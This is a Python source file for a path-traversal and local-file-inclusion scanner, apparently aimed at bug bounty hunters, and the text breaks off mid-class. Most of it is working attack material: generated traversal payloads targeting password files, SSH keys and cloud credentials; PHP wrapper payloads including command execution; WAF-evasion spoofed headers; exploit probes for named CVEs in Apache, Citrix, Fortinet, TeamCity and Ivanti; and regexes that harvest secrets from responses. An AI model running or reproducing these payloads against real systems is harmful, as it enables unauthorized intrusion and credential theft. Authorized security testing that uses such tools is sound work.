#!/usr/bin/env python3
"""
================================================================================
DotSlash — Professional Path Traversal & LFI Scanner 
Bug Bounty / VDP Edition — stdin-pipe compatible, concurrent multi-host
================================================================================

AUTHORIZED USE ONLY...

Unauthorized scanning violates the CFAA, Computer Misuse Act, and equivalent
laws worldwide. The --i-have-authorization flag is not a waiver — you are
personally responsible for confirming scope before running.

Dependencies: pip install requests beautifulsoup4
Usage:
  python3 DotSlash.py -u "https://target.com/view?file=test"
  cat urls.txt | python3 DotSlash.py --i-have-authorization
  python3 DotSlash.py -l targets.txt --force-append -t 20 -o report.html
================================================================================
"""

import sys, os, re, json, time, hashlib, random, logging, argparse
import difflib, threading, queue, base64, posixpath
from collections import defaultdict
from datetime import datetime, timezone
from urllib.parse import (urlparse, parse_qs, urlencode, urlunparse,
                          urljoin, quote)
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[!] pip install requests"); sys.exit(1)

try:
    from bs4 import BeautifulSoup; BS4 = True
except ImportError:
    BS4 = False

# ─── terminal colours ────────────────────────────────────────────────────────
R="\033[91m"; G="\033[92m"; Y="\033[93m"; C="\033[96m"
B="\033[1m";  D="\033[2m";  X="\033[0m"

logging.basicConfig(level=logging.INFO, format="%(message)s",
                    handlers=[logging.StreamHandler(sys.stderr)])
log = logging.getLogger("PathScan")

def info(m): log.info(f"{C}[*]{X} {m}")
def good(m): log.info(f"{G}{B}[+]{X} {m}")
def warn(m): log.info(f"{Y}[!]{X} {m}")
def disc(m): log.info(f"{Y}[!] Potential Path Disclosure / Verbose Error:{X} {m}")
def hit(m):  log.info(f"{R}{B}[VULN]{X} {m}")
def err(m):  log.info(f"{R}[ERR]{X} {m}")


# ─── USER-AGENT POOL (rotated per request) ───────────────────────────────────
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 14; Mobile; rv:125.0) Gecko/125.0 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) OPR/109.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
    "python-httpx/0.27.0", "Go-http-client/2.0", "curl/8.6.0", "Wget/1.21.4",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "PostmanRuntime/7.36.0",
]

# Anti-WAF / source-spoofing headers added to every request
STEALTH_HEADERS = {
    "X-Forwarded-For":        "127.0.0.1",
    "X-Originating-IP":       "127.0.0.1",
    "X-Remote-IP":            "127.0.0.1",
    "X-Remote-Addr":          "127.0.0.1",
    "X-Client-IP":            "127.0.0.1",
    "X-Real-IP":              "127.0.0.1",
    "X-Host":                 "localhost",
    "X-Custom-IP-Authorization": "127.0.0.1",
    "Forwarded":              "for=127.0.0.1;host=localhost;proto=https",
}

# Params to inject when --force-append is used on bare URLs
FORCE_PARAMS = [
    "file","filename","path","filepath","page","view","doc","document",
    "image","img","src","source","template","load","read","fetch","get",
    "download","dir","folder","include","inc","require","content","data",
    "url","uri","resource","report","export","log","cfg","config","conf",
    "module","theme","layout","skin","action","base","root","media",
    "input","output","target","dest","location","name","type","asset",
    "open","show","preview","display","render","serve","redirect",
]

# File-like param keywords used to decide full vs reduced payload set
FILE_PARAM_KEYWORDS = {
    "file","filename","path","filepath","img","image","doc","document",
    "view","download","source","template","load","fetch","get","src",
    "include","inc","require","url","uri","page","dir","read","content",
    "data","export","report","log","cfg","conf","config","resource",
    "media","asset","theme","layout","base","root","module",
}


# ─────────────────────────────────────────────────────────────────────────────
# PAYLOAD ENGINE — Classes 1–11, A, B-2
# All 13 classes, dynamically generated
# ─────────────────────────────────────────────────────────────────────────────
def _build_payloads():
    P = []
    def add(v, c, n, o="linux"):
        P.append({"vector":v,"cls":c,"cls_name":n,"os":o})

    LINUX  = ["/etc/passwd","/etc/hosts","/etc/shadow","/proc/self/environ"]
    WIN    = ["windows\\win.ini","windows\\System32\\drivers\\etc\\hosts"]

    # ── Class 1: Standard Relative Traversal ─────────────────────────────────
    for d in range(1, 10):
        for t in LINUX:
            add("../"*d + t.lstrip("/"), "1", "Standard Relative Traversal")
        for t in WIN:
            add("..\\"*d + t, "1", "Standard Relative Traversal", "windows")

    # ── Class 2: Windows Cross-Compatible ────────────────────────────────────
    for d in range(2, 8):
        add("..\\"*d + "windows\\win.ini",           "2","Windows Cross-Compatible","windows")
        add("..\\/"*d + "windows/win.ini",           "2","Windows Cross-Compatible","windows")
        add("..\\"*d + "Windows\\System32\\drivers\\etc\\hosts","2","Windows Cross-Compatible","windows")
        add("..//"   *d + "windows/win.ini",         "2","Windows Cross-Compatible","windows")

    # ── Class 3: Absolute Path Override ──────────────────────────────────────
    for t in ["/etc/passwd","/etc/shadow","/etc/hosts","/etc/group",
              "/etc/crontab","/proc/self/environ","/proc/version",
              "/proc/self/cmdline","/proc/net/tcp",
              "/var/log/apache2/access.log","/var/log/nginx/access.log",
              "/root/.ssh/id_rsa","/root/.bash_history"]:
        add(t, "3","Absolute Path Override")
        add("file://"+t, "3","Absolute Path Override (file://)")
    for t in ["C:\\windows\\win.ini","C:\\inetpub\\wwwroot\\web.config",
              "C:\\Windows\\System32\\config\\SAM","\\windows\\win.ini"]:
        add(t, "3","Absolute Path Override","windows")

    # ── Class 4: Non-Recursive Strip Bypass ──────────────────────────────────
    for d in range(2, 7):
        add("..../"  *d + "etc/passwd", "4","Non-Recursive Strip Bypass")
        add("....//" *d + "etc/passwd", "4","Non-Recursive Strip Bypass")
        add("...."   *d + "/etc/passwd","4","Non-Recursive Strip Bypass")
        add("...\\.."*d +"\\windows\\win.ini","4","Non-Recursive Strip Bypass","windows")

    # ── Class 5: Split Dot Injection ─────────────────────────────────────────
    for d in range(2, 6):
        add("..././"*d + "etc/passwd", "5","Split Dot Injection")
        add(".../.../"*d+"etc/passwd", "5","Split Dot Injection")
        add("./."*d   + "/etc/passwd","5","Split Dot Injection")
        add("/./././"+ "etc/passwd",   "5","Split Dot Injection")

    # ── Class 6: Multi-Layer Nesting / Deep Paths ─────────────────────────────
    for d in [12,15,20,25,30]:
        add("../"*d + "etc/passwd",     "6","Multi-Layer Deep Nesting")
        add("..\\"*d + "windows\\win.ini","6","Multi-Layer Deep Nesting","windows")
    add("A"*200 + "/../"*6 + "etc/passwd", "6","Path Truncation Overflow")
    add("A"*500 + "/../"*8 + "etc/passwd", "6","Path Truncation Overflow (long)")

    # ── Class 7: Single URL Encoding ─────────────────────────────────────────
    for d in range(2, 7):
        for enc,label in [
            ("%2e%2e%2f","url_single"),("%2e%2e/","url_half"),
            ("..%2f","slash_only"),("%2e%2e%5c","backslash"),
            ("..%5c","backslash_half"),("..%2F","slash_upper"),
        ]:
            add(enc*d + "etc/passwd","7",f"Single URL Encoding ({label})")
        add("%2e%2e%5c"*d + "windows%5cwin.ini","7","Single URL Encoded (win)","windows")

    # ── Class 8: Double URL Encoding ─────────────────────────────────────────
    for d in range(2, 7):
        for enc,label in [
            ("%252e%252e%252f","double_full"),("%252e%252e/","double_half"),
            ("..%252f","double_slash"),("%252e%252e%255c","double_backslash"),
            ("%252e%252e%252F","double_upper"),
        ]:
            add(enc*d + "etc/passwd","8",f"Double URL Encoding ({label})")

    # ── Class 9: Overlong UTF-8 ───────────────────────────────────────────────
    for d in range(2, 6):
        for enc,label in [
            ("..%c0%af","overlong_af"),("..%c1%9c","overlong_9c"),
            ("..%c0%ae/","overlong_ae"),("..%e0%80%af","overlong_e0"),
            ("..%ef%bc%8f","fullwidth"),
        ]:
            add(enc*d + "etc/passwd","9",f"Overlong UTF-8 ({label})")

    # ── Class 10: Null Byte Injection ─────────────────────────────────────────
    for d in range(2, 8):
        for ext in [".jpg",".png",".gif",".pdf",".txt",".php",".asp",".aspx",".jpeg",".bmp"]:
            add("../"*d + f"etc/passwd%00{ext}","10",f"Null Byte ({ext})")
        add("../"*d + "etc/passwd%00","10","Null Byte (bare)")

    # ── Class 11: Start-of-Path Prefix Bypass ────────────────────────────────
    # App validates path.startswith(BASE) — satisfy prefix then traverse out
    BASE_PATHS = [
        "/var/www/images","/var/www/html","/var/www/static","/var/www/uploads",
        "/var/www/files","/var/www/media","/var/www/assets","/var/www",
        "/usr/share/nginx/html","/usr/share/nginx/images","/usr/share/nginx/static",
        "/usr/share/apache2","/srv/http","/srv/www",
        "/app/static","/app/public","/app/uploads","/app/files","/app/images",
        "/opt/app","/opt/app/static","/home/app","/home/www",
        "/public","/static","/uploads","/files","/images",
        "/media","/assets","/data","/content","/downloads","/resources","/storage",
    ]
    LINUX11 = ["etc/passwd","etc/shadow","etc/hosts","proc/self/environ"]
    NULL11  = [".jpg",".png",".gif"]
    for base in BASE_PATHS:
        depth = base.count("/")
        for ed in range(1, depth+4):  # try all plausible escape depths
            esc  = "../"  * ed
            enc  = "..%2F"* ed
            dbl  = "..%252F"*ed
            for t in LINUX11:
                add(base+"/"+esc+t,  "11",f"Start-of-Path Prefix Bypass ({base})")
                add(base+"/"+enc+t,  "11",f"Start-of-Path URL-encoded ({base})")
                add(base+"/"+dbl+t,  "11",f"Start-of-Path Double-encoded ({base})")
                for ext in NULL11:
                    add(base+"/"+esc+t+"%00"+ext,"11",
                        f"Start-of-Path + Null Byte ({base})")

    # ── Class A: Arbitrary File Read / LFI Targets ───────────────────────────
    LFI_FILES = [
        ".env",".env.local",".env.production",".env.backup",".env.staging",
        "wp-config.php","config.php","configuration.php","settings.php",
        "web.xml","WEB-INF/web.xml","WEB-INF/classes/application.properties",
        "META-INF/context.xml",
        ".git/config",".git/HEAD",".git/COMMIT_EDITMSG",".git/logs/HEAD",
        "package.json","composer.json","Gemfile","requirements.txt",
        "config.yml","config.yaml","config.json","config.ini","config.xml",
        "database.yml","database.php","db.php",
        "settings.py","local_settings.py","settings_local.py",
        "application.properties","application.yml","application.yaml",
        "appsettings.json","appsettings.Development.json","web.config",
        ".htaccess",".htpasswd",
        "id_rsa",".ssh/id_rsa",".ssh/authorized_keys",".ssh/known_hosts",
        "docker-compose.yml","Dockerfile","docker-compose.override.yml",
        ".npmrc",".pypirc",".netrc","credentials",
        "/proc/self/environ","/proc/self/cmdline","/proc/self/maps",
        "/proc/self/fd/0","/proc/net/tcp","/proc/version",
        "/var/www/html/.env","/var/www/.env",
        "/home/ubuntu/.env","/home/www-data/.env",
        "/etc/nginx/nginx.conf","/etc/nginx/sites-enabled/default",
        "/etc/apache2/apache2.conf","/etc/apache2/sites-enabled/000-default.conf",
        "/etc/ssh/sshd_config","/etc/passwd","/etc/shadow",
        # Cloud/container
        "/var/lib/cloud/instance/user-data.txt",
        "/run/secrets/kubernetes.io/serviceaccount/token",
        "/run/secrets/kubernetes.io/serviceaccount/ca.crt",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/.docker/config.json","/root/.aws/credentials",
        "/root/.aws/config","/root/.azure/credentials",
        "/root/.config/gcloud/credentials.db",
        # PHP wrappers & protocols
        "php://filter/convert.base64-encode/resource=index.php",
        "php://filter/convert.base64-encode/resource=config.php",
        "php://filter/convert.base64-encode/resource=wp-config.php",
        "php://filter/convert.base64-encode/resource=database.php",
        "php://filter/read=string.toupper/resource=index.php",
        "php://filter/zlib.deflate/convert.base64-encode/resource=index.php",
        "php://input",
        "data://text/plain;base64,dGVzdA==",
        "expect://id",
        "zip://shell.jpg#shell.php",
        "phar://archive.phar/file.php",
    ]
    for d in range(1, 7):
        pre = "../"*d
        for t in LFI_FILES:
            if not (t.startswith("/") or t.startswith("php://")
                    or t.startswith("data://") or t.startswith("expect://")
                    or t.startswith("zip://") or t.startswith("phar://")):
                add(pre + t, "A","Arbitrary File Read / LFI Target","any")
    for t in LFI_FILES:
        if (t.startswith("/") or t.startswith("php://") or t.startswith("data://")
                or t.startswith("expect://") or t.startswith("zip://")
                or t.startswith("phar://")):
            add(t, "A","Arbitrary File Read / LFI Target","any")

    # ── Class B-2: Extension Enforcement Bypass ───────────────────────────────
    EXTS = [".jpg",".jpeg",".png",".gif",".bmp",".pdf",".doc",".docx",".txt",".csv"]
    for d in range(2, 7):
        pre = "../"*d
        for ext in EXTS:
            add(pre + f"etc/passwd%00{ext}","B-2",f"Extension Enforcement Null Byte ({ext})")
            add(pre + f"etc/passwd\x00{ext}","B-2",f"Extension Enforcement Raw Null ({ext})")
            add(pre + f"etc/passwd{ext}",   "B-2",f"Extension Appended No Null ({ext})")
        for ext in [".jpg",".png",".txt"]:
            add("..\\"*d + f"windows\\win.ini%00{ext}","B-2",f"Win Extension Null ({ext})","windows")

    # ── Unicode / IIS %u Encoding ─────────────────────────────────────────────
    # IIS accepts %uXXXX encoding and some WAFs miss it
    for d in range(2, 6):
        add("%u002e%u002e%u002f"*d + "etc/passwd","7",
            "IIS %u Unicode Encoding","windows")
        add("%u002e%u002e/"*d + "etc/passwd","7",
            "IIS %u Unicode Half-encoded","windows")
        add("..%u2215"*d + "etc/passwd","7",
            "Unicode Division Slash %u2215")
        add("..%u2216"*d + "etc%u2216passwd","7",
            "Unicode Reverse Solidus %u2216")
        add("%uff0e%uff0e%u2215"*d+"etc/passwd","7",
            "Unicode Full-Width Dot+Slash")

    # ── Windows IIS 8.3 Short Name (Tilde) ───────────────────────────────────
    # Used to enumerate directory names when LFI doesn't need full path
    for d in range(2, 5):
        add("..\\"*d + "progra~1\\","7","IIS 8.3 Short Name Traversal","windows")
        add("..\\"*d + "inetpu~1\\wwwroot\\web.config","7",
            "IIS 8.3 Tilde inetpub","windows")
        add("../"+"..\\"*d + "windows\\win.ini","7","IIS Mixed Separator","windows")

    # Deduplicate on vector string
    seen = set(); result = []
    for p in P:
        if p["vector"] not in seen:
            seen.add(p["vector"]); result.append(p)
    return result


ALL_PAYLOADS = _build_payloads()
info(f"Payload library: {len(ALL_PAYLOADS)} unique vectors across Classes 1–11, A, B-2")


# ─────────────────────────────────────────────────────────────────────────────
# TIER-1: FAST BYTE SIGNATURES (checked before any regex)
# ─────────────────────────────────────────────────────────────────────────────
TIER1 = [
    # Linux passwd/shadow
    b"root:x:0:0:", b"bin:x:1:1:", b"daemon:x:", b"nobody:x:",
    b"HOME=/root", b"HOME=/home", b"SHELL=/bin/bash", b"SHELL=/bin/sh",
    b"PATH=/usr/local/sbin", b"PATH=/usr/bin:",
    # SSH keys
    b"-----BEGIN RSA PRIVATE KEY-----", b"-----BEGIN OPENSSH PRIVATE KEY-----",
    b"-----BEGIN EC PRIVATE KEY-----", b"-----BEGIN DSA PRIVATE KEY-----",
    # Windows
    b"[fonts]", b"[extensions]", b"[boot loader]", b"[Mail]",
    b"for 16-bit app support", b"MAPI=1",
    # Config / credentials
    b"DB_PASSWORD=", b"DB_HOST=", b"SECRET_KEY=", b"APP_KEY=",
    b"AWS_ACCESS_KEY_ID=", b"GOOGLE_API_KEY=", b"database_password",
    b"connectionString", b"<connectionStrings>",
    b"define('DB_PASSWORD'", b"define('AUTH_KEY'",
    b"aws_secret_access_key", b"aws_access_key_id",
    # JWT RS256 header prefix (Kubernetes service account tokens)
    b"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9",
    # Docker / K8s
    b'"auths":', b"KUBE_", b"kubernetes.io",
    # Environment leakage
    b"HOSTNAME=", b"USER=root", b"PWD=/",
]

def tier1_check(content):
    for sig in TIER1:
        if sig in content:
            return True, sig
    return False, None

# ─────────────────────────────────────────────────────────────────────────────
# TIER-2: SECRET EXTRACTION (only after tier-1 match)
# ─────────────────────────────────────────────────────────────────────────────
SECRET_PATTERNS = [
    ("AWS Access Key",     re.compile(r"(?:AKIA|ASIA|AROA)[A-Z0-9]{16}")),
    ("AWS Secret Key",     re.compile(r"aws_secret_access_key\s*=\s*([A-Za-z0-9/+=]{40})",re.I)),
    ("Google API Key",     re.compile(r"AIza[0-9A-Za-z\-_]{35}")),
    ("GitHub Token",       re.compile(r"gh[opsu]_[A-Za-z0-9]{36,}")),
    ("JWT Token",          re.compile(r"eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")),
    ("Slack Token",        re.compile(r"xox[baprs]-[0-9A-Za-z\-]+")),
    ("Stripe Live Key",    re.compile(r"sk_live_[0-9a-zA-Z]{24}")),
    ("Stripe Test Key",    re.compile(r"sk_test_[0-9a-zA-Z]{24}")),
    ("Twilio Auth Token",  re.compile(r"SK[0-9a-fA-F]{32}")),
    ("Heroku API Key",     re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}")),
    ("SendGrid API Key",   re.compile(r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}")),
    ("DB Password",        re.compile(r"(?:DB_PASS(?:WORD)?|database_password|db_password|MYSQL_PASSWORD)\s*[=:]\s*(\S+)",re.I)),
    ("DB Host",            re.compile(r"(?:DB_HOST|DATABASE_URL|DB_NAME)\s*[=:]\s*(\S+)",re.I)),
    ("Secret Key",         re.compile(r"(?:SECRET_KEY|APP_KEY|JWT_SECRET|AUTH_SECRET)\s*[=:]\s*['\"]?([^\s'\"&]{10,})",re.I)),
    ("Private Key Block",  re.compile(r"-----BEGIN (?:RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----")),
    ("SSH Auth Key",       re.compile(r"ssh-(?:rsa|ed25519|ecdsa) [A-Za-z0-9+/]+")),
    ("Connection String",  re.compile(r"(?:mongodb|mysql|postgres|mssql|redis|amqp)://[^\s'\"]+")),
    ("K8s Token",          re.compile(r"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9\.[A-Za-z0-9_-]+")),
    ("Internal IPv4",      re.compile(r"(?:10\.|172\.(?:1[6-9]|2\d|3[01])\.|192\.168\.)\d+\.\d+")),
    ("Generic Password",   re.compile(r"(?:password|passwd|secret|token)\s*[=:]\s*['\"]?([^\s'\"&]{8,})",re.I)),
    ("Azure Key",          re.compile(r"[A-Za-z0-9+/]{88}==")),
    ("NPM Token",          re.compile(r"npm_[A-Za-z0-9]{36}")),
    ("Private IP / Cred",  re.compile(r"(?:admin|root|administrator):[^\s@]+@")),
]

def tier2_extract(text):
    found = []
    for label, pat in SECRET_PATTERNS:
        m = pat.search(text)
        if m:
            found.append((label, m.group(0)[:150]))
    return found

# ─────────────────────────────────────────────────────────────────────────────
# ERROR ORACLE
# ─────────────────────────────────────────────────────────────────────────────
ERROR_SIGS = [
    "java.io.FileNotFoundException","java.io.IOException",
    "java.lang.IllegalArgumentException",
    "ENOENT: no such file or directory","No such file or directory",
    "open() failed","fopen(","fopen() failed",
    "Warning: file_get_contents(","Warning: include(","Warning: require(",
    "failed to open stream: no such file","io/ioutil.ReadFile","os.Open(",
    "PathTraversalException","FileExistsException","InvalidPathException",
    "DirectoryNotFoundException","System.IO.IOException",
    "System.IO.FileNotFoundException","System.UnauthorizedAccessException",
    "Permission denied","Access is denied",
    "The system cannot find the file specified",
    "The filename, directory name, or volume label syntax is incorrect",
    "cannot open file","[an error occurred while processing this directive]",
    "org.springframework.web.servlet","ResourceHttpRequestHandler",
    "StaticResourceHandler","Errno::ENOENT","RuntimeError: File not found",
    "open_basedir restriction","include_path",
]

def error_oracle(text):
    for sig in ERROR_SIGS:
        if sig in text:
            return sig
    return None


# ─────────────────────────────────────────────────────────────────────────────
# CVE-SPECIFIC PROBES
# ─────────────────────────────────────────────────────────────────────────────
def _build_cve_probes(origin):
    P = []
    o = origin.rstrip("/")

    def add(cve, desc, method, path, verify, body=None, hdrs=None):
        P.append({"cve":cve,"desc":desc,"method":method,
                  "url":o+path,"verify":verify,"body":body,"headers":hdrs or {}})

    def has_passwd(r):  return b"root:x:0:0:" in r.content
    def has_win(r):     return b"[fonts]" in r.content or b"[extensions]" in r.content
    def has_env(r):     return any(b in r.content for b in [b"HOME=/",b"PATH=/",b"SECRET",b"PASSWORD"])
    def ok200(r):       return r.status_code == 200 and len(r.content) > 30
    def any_2xx(r):     return 200 <= r.status_code < 300

    # ── CVE-2024-21626: runc container escape via /proc/self/cwd ─────────────
    for path in ["/proc/self/cwd/etc/passwd",
                 "/%2e%2e/%2e%2e/proc/self/cwd/etc/passwd",
                 "/../proc/self/cwd/etc/passwd",
                 "/proc/self/cwd/../../../etc/passwd"]:
        add("CVE-2024-21626","runc container escape /proc/self/cwd","GET",path,has_passwd)

    # ── CVE-2021-41773: Apache 2.4.49 path traversal ─────────────────────────
    for path in ["/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                 "/.%2e/.%2e/.%2e/.%2e/etc/passwd",
                 "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                 "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                 "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/shadow"]:
        add("CVE-2021-41773","Apache 2.4.49 URL-encoded path traversal","GET",path,has_passwd)

    # ── CVE-2021-42013: Apache 2.4.50 double-encoded bypass ──────────────────
    for path in ["/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd",
                 "/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd",
                 "/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"]:
        add("CVE-2021-42013","Apache 2.4.50 double-encoded (incomplete 41773 patch)","GET",path,has_passwd)

    # ── CVE-2024-38475: Apache mod_rewrite / SonicWall SMA100 ────────────────
    # Apache mod_rewrite improper escaping allows mapping URLs to FS locations
    for path in [
        "/cgi-bin/.1.1.1.1a-1.css/../../../etc/passwd",
        "/.1.1.1.1a-1.css/../../../etc/passwd",
        "/images/.1.1.1.1a-1.css/../../etc/passwd",
        "/static/.1.1.1.1a-1.css/../../../etc/passwd",
        # SonicWall specific paths for session DB exfil
        "/cgi-bin/.1.1.1.1a-1.css/../../../etc/passwd",
        "/cgi-bin/.1.2.3.4a-1.css/../../../etc/passwd",
    ]:
        add("CVE-2024-38475","Apache mod_rewrite URL mapping bypass (SonicWall SMA100)","GET",path,has_passwd)

    # ── CVE-2020-3452: Cisco ASA / Firepower ─────────────────────────────────
    for path in [
        "/+CSCOE+/files/file_list.json?path=/sessions",
        "/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua",
        "/+CSCOE+/win.ini",
        "/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal&default-language&lang=..%2F",
        "/+CSCOE+/logon.html"]:
        add("CVE-2020-3452","Cisco ASA/Firepower unauthorized file read via +CSCOE+","GET",path,ok200)

    # ── CVE-2019-19781: Citrix ADC / NetScaler ───────────────────────────────
    for path in [
        "/vpn/../vpns/cfg/smb.conf",
        "/vpn/%2F..%2Fvpns%2Fcfg%2Fsmb.conf",
        "/vpn/..%2Fvpns%2Fcfg%2Fsmb.conf",
        "/vpn/../vpns/portal/themes/portal/php/login.php",
        "/vpn/../vpns/portal/",
        "/cgi-bin/./../vpns/cfg/smb.conf"]:
        add("CVE-2019-19781","Citrix ADC/NetScaler smb.conf traversal","GET",path,any_2xx)

    # ── CVE-2024-27199: JetBrains TeamCity path traversal auth bypass ─────────
    # Bypass authentication using ../ to reach admin endpoints via /res/ prefix
    for path in [
        "/res/../admin/diagnostic.jsp",
        "/res/../app/rest/server",
        "/update/../admin/diagnostic.jsp",
        "/.well-known/acme-challenge/../admin/diagnostic.jsp",
        "/res/../app/rest/users",
        "/res/../app/https/settings/uploadCertificate",
        "/res/../app/https/settings/certificateInfo",
        "/res/../app/pipeline/build",
        "/update/../app/rest/server",
        "/.well-known/acme-challenge/../app/rest/server"]:
        add("CVE-2024-27199","JetBrains TeamCity auth bypass via path traversal (/../res/)","GET",
            path, lambda r: r.status_code == 200)

    # ── CVE-2023-28432: MinIO information disclosure ──────────────────────────
    add("CVE-2023-28432","MinIO info disclosure — MINIO_SECRET_KEY / ROOT_PASSWORD","POST",
        "/minio/health/cluster",
        lambda r: any(k in r.content for k in [b"MINIO_SECRET_KEY",b"MINIO_ROOT_PASSWORD",b"MINIO_ACCESS_KEY"]))
    add("CVE-2023-28432","MinIO /cluster/config endpoint","GET","/minio/health/live",ok200)

    # ── CVE-2024-38819: Spring WebMvc.fn / WebFlux.fn ────────────────────────
    for path in [
        "/static/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/resources/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/public/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/assets/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/static/..%2F..%2F..%2Fetc%2Fpasswd",
        "/webjars/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/static/%252e%252e/%252e%252e/%252e%252e/etc/passwd"]:
        add("CVE-2024-38819","Spring WebMvc.fn/WebFlux.fn static resource traversal","GET",path,has_passwd)

    # ── CVE-2025-41242: Spring MVC non-compliant servlet containers ────────────
    for path in [
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
        "/%2e%2e/%2e%2e/WEB-INF/web.xml",
        "/%2e%2e/%2e%2e/%2e%2e/etc/shadow"]:
        add("CVE-2025-41242","Spring MVC path traversal non-compliant servlet","GET",path,
            lambda r: has_passwd(r) or b"web-app" in r.content.lower())

    # ── CVE-2025-64446: Fortinet FortiWeb auth bypass + path traversal ─────────
    for path in [
        "/api/v2.0/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
        "/api/v2.0/..%2F..%2F..%2Fetc%2Fpasswd",
        "/api/v2.0/%252e%252e/%252e%252e/etc/passwd",
        "/api/v2.0/%2e%2e/%2e%2e/%2e%2e/etc/shadow"]:
        add("CVE-2025-64446","FortiWeb auth bypass + path traversal /api/v2.0/","GET",path,has_passwd)

    # ── CVE-2018-13379: Fortinet FortiGate SSL VPN ────────────────────────────
    add("CVE-2018-13379","FortiGate SSL VPN session file read","GET",
        "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
        lambda r: r.status_code == 200 and len(r.content) > 50)

    # ── CVE-2025-30208: Vite dev server @fs alias bypass ─────────────────────
    for path in ["/@fs/etc/passwd","/@fs//etc/passwd",
                 "/@fs/../../../../etc/passwd","/@fs/.env","/@fs/etc/shadow"]:
        add("CVE-2025-30208","Vite dev server @fs alias arbitrary file read","GET",path,
            lambda r: has_passwd(r) or has_env(r))

    # ── CVE-2024-10811/13159: Ivanti EPM CVSS 9.8 ────────────────────────────
    for path in [
        "/wsStatusList?file=../../../etc/passwd",
        "/mdm/checkin?file=../../../../etc/passwd",
        "/landesk/managementsuite/core/core.DataAccessLayerProcessorPOST.asmx/../../../../../../etc/passwd",
        "/ams/agent/../../../../../../../etc/passwd"]:
        add("CVE-2024-10811/13159","Ivanti EPM absolute path traversal (CVSS 9.8)","GET",path,has_passwd)

    # ── CVE-2023-32235: Ghost CMS ─────────────────────────────────────────────
    for path in ["/assets/built/../../package.json",
                 "/assets/built/../../config.production.json",
                 "/assets/built/../../.env"]:
        add("CVE-2023-32235","Ghost CMS /assets/built/../../ traversal","GET",path,
            lambda r: r.status_code == 200 and (b"name" in r.content and b"version" in r.content))

    # ── Nginx off-by-slash alias misconfiguration ─────────────────────────────
    for pfx in ["/static","/files","/assets","/images","/uploads","/media","/data","/public"]:
        add("NGINX-ALIAS-TRAVERSAL",f"Nginx off-by-slash alias ({pfx}../etc/passwd)","GET",
            f"{pfx}../etc/passwd",has_passwd)

    # ── IIS Tilde 8.3 short-name enumeration ─────────────────────────────────
    for path in ["/aspnet~1/","/web~1.con","/iissta~1/","/*~1*/","/WEB-IN~1/"]:
        add("IIS-TILDE-ENUM","IIS 8.3 short filename enumeration via tilde","GET",path,
            lambda r: r.status_code in [200,301,302,403])

    return P


# ─────────────────────────────────────────────────────────────────────────────
# WAF DETECTOR + PER-DOMAIN BACKOFF
# ─────────────────────────────────────────────────────────────────────────────
WAF_SIGS = {
    "Cloudflare":  ["CF-RAY","__cfduid","cf-cache-status","cloudflare"],
    "Akamai":      ["AkamaiGHost","akamai","X-Check-Cacheable"],
    "AWS WAF":     ["X-AMZ-CF-ID","x-amz-request-id"],
    "ModSecurity": ["Mod_Security","NOYB","mod_security"],
    "F5 BIG-IP":   ["X-WA-Info","BigIP","F5"],
    "Imperva":     ["X-Iinfo","incap_ses","visid_incap","Incapsula"],
    "Fortinet":    ["FORTIWAFSID","Fortigate"],
    "Barracuda":   ["barra_counter_session","BNI__BARRACUDA_LB_COOKIE"],
    "Sucuri":      ["x-sucuri-id","sucuri-clientside"],
    "Fastly":      ["X-Served-By","Fastly"],
}

class BackoffMgr:
    """Thread-safe per-domain exponential backoff."""
    def __init__(self):
        self._lock  = threading.Lock()
        self._cnt   = defaultdict(int)
        self._delay = defaultdict(float)

    def block(self, domain):
        with self._lock:
